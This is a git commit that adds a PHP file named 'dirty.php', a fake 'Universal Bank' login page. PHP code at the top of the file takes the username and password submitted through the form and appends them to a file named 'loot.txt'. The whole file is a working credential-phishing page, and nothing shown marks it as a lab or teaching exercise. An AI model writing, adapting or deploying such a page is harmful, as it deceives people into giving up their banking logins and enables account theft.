e0b084636d96f45e0e9fd081d1da6a7dae91f9a3
Adam <33823436+DerpyDinosaur@users.noreply.github.com>
2021-02-20 16:31:32 +0800

    Add files via upload

---
+++ dirty.php
@@ -0,0 +1,39 @@
+<?php
+	if (isset($_GET['username']) && isset($_GET['password'])) {
+		$file = fopen("loot.txt", "a+") or die();
+
+		$user = "Username: ".$_GET['username']."\n";
+		$pass = "Password: ".$_GET['password']."\n\n";
+
+		fwrite($file, $user);
+		fwrite($file, $pass);
+		fclose($file);
+	}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="description" content="Bank Login">
+	<meta name=viewport content="width=device-width, initial-scale=1">
+	<title>Universal Bank Login</title>
+	<!-- Stylesheets -->
+	<link rel="stylesheet" type="text/css" href="bootstrap.css">
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+	<header>
+		<h1 style="color: red;">The Universal Bank</h1>
+	</header>
+	<main>
+		<h2 class="loginHeader">Login Page</h2>
+		<form>
+			<h4>Username</h4>
+			<input class="form-control" type="text" name="username">
+			<h4>Password</h4>
+			<input class="form-control" type="text" name="password">
+			<button class='btn btn-success' type='submit'>Sign Up</button>
+		</form>
+	</main>
+</body>
+</html>
